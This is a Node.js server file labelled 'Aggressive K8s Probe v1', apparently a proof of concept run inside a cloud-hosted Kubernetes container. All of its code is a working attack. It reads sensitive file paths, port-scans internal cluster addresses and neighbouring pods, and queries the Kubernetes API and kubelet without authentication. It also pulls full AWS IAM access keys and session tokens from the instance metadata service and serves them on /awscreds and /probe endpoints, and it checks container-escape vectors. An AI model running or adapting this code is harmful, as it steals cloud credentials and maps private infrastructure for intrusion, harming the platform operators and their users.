const http = require("http");
const https = require("https");
const { execSync, spawn } = require("child_process");
const fs = require("fs");
const net = require("net");
const dns = require("dns");
const os = require("os");

const results = {
  system: {},
  network: {},
  k8sNetwork: {},
  resourceAbuse: {},
  internalServices: {},
  awsCreds: {},
  containerInfo: {}
};

// 1. System info
try {
  results.system = {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    cpus: os.cpus().length,
    totalMem: os.totalmem(),
    freeMem: os.freemem(),
    uptime: os.uptime(),
    networkInterfaces: os.networkInterfaces()
  };
} catch(e) { results.system.error = e.message; }

// 2. Container filesystem exploration
try {
  results.containerInfo.procMounts = fs.existsSync("/proc/mounts") ? 
    fs.readFileSync("/proc/mounts", "utf8").substring(0, 2000) : "not found";
  results.containerInfo.cgroups = fs.existsSync("/proc/1/cgroup") ?
    fs.readFileSync("/proc/1/cgroup", "utf8") : "not found";
  results.containerInfo.dockerenv = fs.existsSync("/.dockerenv");
  results.containerInfo.kubernetesSA = fs.existsSync("/var/run/secrets/kubernetes.io");
  
  // Check for sensitive files
  const sensitivePaths = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/resolv.conf",
    "/proc/1/environ", "/proc/self/environ", "/root/.ssh/id_rsa",
    "/var/run/docker.sock", "/run/containerd/containerd.sock"
  ];
  results.containerInfo.sensitiveFiles = {};
  for (const p of sensitivePaths) {
    try {
      const stat = fs.statSync(p);
      results.containerInfo.sensitiveFiles[p] = { exists: true, size: stat.size };
      if (p === "/etc/hosts" || p === "/etc/resolv.conf") {
        results.containerInfo.sensitiveFiles[p].content = fs.readFileSync(p, "utf8");
      }
    } catch(e) { 
      results.containerInfo.sensitiveFiles[p] = { exists: false };
    }
  }
} catch(e) { results.containerInfo.error = e.message; }

// 3. DNS resolution for K8s services
async function resolveDNS() {
  const k8sServices = [
    "kubernetes.default.svc.cluster.local",
    "kube-dns.kube-system.svc.cluster.local",
    "default.svc.cluster.local",
    "kuros-api.default.svc.cluster.local",
    "postgres.default.svc.cluster.local",
    "redis.default.svc.cluster.local",
    "mongodb.default.svc.cluster.local"
  ];
  
  results.k8sNetwork.dnsResolution = {};
  for (const svc of k8sServices) {
    try {
      const addrs = await new Promise((resolve, reject) => {
        dns.resolve4(svc, (err, addresses) => {
          if (err) reject(err);
          else resolve(addresses);
        });
      });
      results.k8sNetwork.dnsResolution[svc] = addrs;
    } catch(e) {
      results.k8sNetwork.dnsResolution[svc] = { error: e.code || e.message };
    }
  }
}

// 4. Port scan internal network
async function scanPort(host, port, timeout = 1000) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(timeout);
    socket.on("connect", () => { socket.destroy(); resolve(true); });
    socket.on("timeout", () => { socket.destroy(); resolve(false); });
    socket.on("error", () => { socket.destroy(); resolve(false); });
    socket.connect(port, host);
  });
}

async function scanInternalNetwork() {
  // Scan common internal IPs and ports
  const targets = [
    { host: "10.100.0.1", name: "K8s API" },
    { host: "10.100.188.155", name: "App Service" },
    { host: "192.168.66.176", name: "Node IP" },
    { host: "127.0.0.1", name: "Localhost" }
  ];
  
  const ports = [22, 80, 443, 3000, 5432, 6379, 8080, 8443, 9090, 10250, 10255, 27017];
  
  results.k8sNetwork.portScan = {};
  for (const target of targets) {
    results.k8sNetwork.portScan[target.name] = { host: target.host, openPorts: [] };
    for (const port of ports) {
      const open = await scanPort(target.host, port);
      if (open) {
        results.k8sNetwork.portScan[target.name].openPorts.push(port);
      }
    }
  }
  
  // Scan for other pods in the cluster (10.x.x.x range)
  results.k8sNetwork.podDiscovery = [];
  // Scan a small range around our pod IP
  const myIP = Object.values(os.networkInterfaces())
    .flat()
    .find(i => i.family === "IPv4" && !i.internal)?.address;
  
  if (myIP) {
    results.k8sNetwork.myPodIP = myIP;
    const subnet = myIP.split(".").slice(0, 3).join(".");
    // Quick scan of adjacent IPs
    for (let i = 1; i <= 10; i++) {
      const targetIP = `${subnet}.${i}`;
      if (targetIP !== myIP) {
        const open = await scanPort(targetIP, 80, 200);
        if (open) {
          results.k8sNetwork.podDiscovery.push({ ip: targetIP, port: 80 });
        }
      }
    }
  }
}

// 5. Try to access K8s API server
async function probeK8sAPI() {
  const k8sAPI = "https://10.100.0.1:443";
  
  results.k8sNetwork.apiServer = {};
  
  try {
    // Try without auth
    const resp = await new Promise((resolve, reject) => {
      https.get(`${k8sAPI}/api`, { rejectUnauthorized: false, timeout: 3000 }, (res) => {
        let body = "";
        res.on("data", c => body += c);
        res.on("end", () => resolve({ status: res.statusCode, body: body.substring(0, 500) }));
      }).on("error", reject);
    });
    results.k8sNetwork.apiServer.noAuth = resp;
  } catch(e) {
    results.k8sNetwork.apiServer.noAuth = { error: e.message };
  }
  
  // Try to access kubelet API
  try {
    const kubeletResp = await new Promise((resolve, reject) => {
      https.get("https://192.168.66.176:10250/pods", { rejectUnauthorized: false, timeout: 3000 }, (res) => {
        let body = "";
        res.on("data", c => body += c);
        res.on("end", () => resolve({ status: res.statusCode, body: body.substring(0, 1000) }));
      }).on("error", reject);
    });
    results.k8sNetwork.kubelet = kubeletResp;
  } catch(e) {
    results.k8sNetwork.kubelet = { error: e.message };
  }
}

// 6. AWS IMDS - Get actual credentials
async function getAWSCreds() {
  try {
    // Get token
    const token = await new Promise((r, j) => {
      const req = http.request({
        hostname: "169.254.169.254",
        path: "/latest/api/token",
        method: "PUT",
        headers: { "X-aws-ec2-metadata-token-ttl-seconds": "60" },
        timeout: 2000
      }, res => { let b = ""; res.on("data", c => b += c); res.on("end", () => r(b)); });
      req.on("error", j); req.end();
    });
    
    // Get role
    const role = await new Promise((r, j) => {
      http.get({
        hostname: "169.254.169.254",
        path: "/latest/meta-data/iam/security-credentials/",
        headers: { "X-aws-ec2-metadata-token": token },
        timeout: 2000
      }, res => { let b = ""; res.on("data", c => b += c); res.on("end", () => r(b.trim())); }).on("error", j);
    });
    
    // Get credentials!
    const creds = await new Promise((r, j) => {
      http.get({
        hostname: "169.254.169.254",
        path: "/latest/meta-data/iam/security-credentials/" + role,
        headers: { "X-aws-ec2-metadata-token": token },
        timeout: 2000
      }, res => { let b = ""; res.on("data", c => b += c); res.on("end", () => r(JSON.parse(b))); }).on("error", j);
    });
    
    results.awsCreds = {
      role: role,
      accessKeyId: creds.AccessKeyId,
      secretAccessKey: creds.SecretAccessKey ? creds.SecretAccessKey.substring(0, 10) + "..." : null,
      token: creds.Token ? creds.Token.substring(0, 50) + "..." : null,
      expiration: creds.Expiration,
      type: creds.Type
    };
    
    // Full creds for PoC (will redact in output)
    results.awsCreds._FULL_SECRET = creds.SecretAccessKey;
    results.awsCreds._FULL_TOKEN = creds.Token;
    
  } catch(e) {
    results.awsCreds.error = e.message;
  }
}

// 7. Resource abuse test (fork bomb prevention, memory limits)
function testResourceLimits() {
  results.resourceAbuse.memoryLimit = {};
  results.resourceAbuse.cpuLimit = {};
  
  // Test memory allocation
  try {
    const chunks = [];
    const maxMB = 500;
    for (let i = 0; i < maxMB; i++) {
      chunks.push(Buffer.alloc(1024 * 1024)); // 1MB
      if (i % 100 === 0) {
        results.resourceAbuse.memoryLimit[`${i}MB`] = "allocated";
      }
    }
    results.resourceAbuse.memoryLimit.max = `${maxMB}MB allocated successfully`;
    chunks.length = 0; // Free memory
  } catch(e) {
    results.resourceAbuse.memoryLimit.error = e.message;
  }
  
  // Check ulimits
  try {
    results.resourceAbuse.ulimits = execSync("ulimit -a 2>/dev/null || true", { encoding: "utf8", timeout: 5000 });
  } catch(e) {
    results.resourceAbuse.ulimits = e.message;
  }
}

// 8. Check for escape vectors
function checkEscapeVectors() {
  results.containerInfo.escapeVectors = {};
  
  // Docker socket
  results.containerInfo.escapeVectors.dockerSocket = fs.existsSync("/var/run/docker.sock");
  
  // Privileged mode check
  try {
    const caps = fs.readFileSync("/proc/self/status", "utf8");
    const capBnd = caps.match(/CapBnd:\s+(\w+)/)?.[1];
    results.containerInfo.escapeVectors.capabilities = capBnd;
    // Full caps would be 0000003fffffffff
    results.containerInfo.escapeVectors.privileged = capBnd === "0000003fffffffff";
  } catch(e) {}
  
  // Check if we can mount
  try {
    execSync("mount 2>&1 | head -20", { encoding: "utf8", timeout: 5000 });
    results.containerInfo.escapeVectors.canMount = true;
  } catch(e) {
    results.containerInfo.escapeVectors.canMount = false;
  }
  
  // Check seccomp
  try {
    results.containerInfo.escapeVectors.seccomp = fs.readFileSync("/proc/self/status", "utf8")
      .match(/Seccomp:\s+(\d)/)?.[1] || "unknown";
  } catch(e) {}
}

// Main handler
const server = http.createServer(async (req, res) => {
  if (req.url === "/probe") {
    try {
      checkEscapeVectors();
      testResourceLimits();
      await resolveDNS();
      await scanInternalNetwork();
      await probeK8sAPI();
      await getAWSCreds();
      
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } catch(e) {
      res.writeHead(500);
      res.end(JSON.stringify({ error: e.message, stack: e.stack }));
    }
  } else if (req.url === "/awscreds") {
    // Just get AWS creds
    await getAWSCreds();
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(results.awsCreds, null, 2));
  } else {
    res.writeHead(200);
    res.end("Aggressive K8s Probe v1");
  }
});

server.listen(process.env.PORT || 3000);
console.log("Server started on port " + (process.env.PORT || 3000));
